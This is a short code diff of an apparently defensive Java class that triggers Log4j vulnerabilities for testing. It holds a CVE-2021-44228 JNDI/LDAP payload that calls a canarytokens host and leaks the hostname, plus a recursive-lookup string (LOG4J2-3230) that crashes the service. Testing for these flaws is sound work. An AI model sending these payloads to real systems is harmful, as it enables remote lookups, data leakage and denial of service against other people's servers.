@@ -29,8 +29,8 @@ public class Main implements Runnable {
         final String CVE_2021_4428 = "${jndi:ldap://x${hostName}.L4J.cyvu6gfqc6sd34ii51nht76in.canarytokens.com/a}";
         trigger(0, "CVE-2021-44228", CVE_2021_4428);
 
-        final String BOMB = "${${::-${::-$${::-j}}}}";
-        trigger(1, "Eval Bomb", BOMB);
+        final String LOG4J2_3230 = "${${::-${::-$${::-j}}}}";
+        trigger(1, "LOG4J2-3230", LOG4J2_3230);
     }
 
     private void trigger(
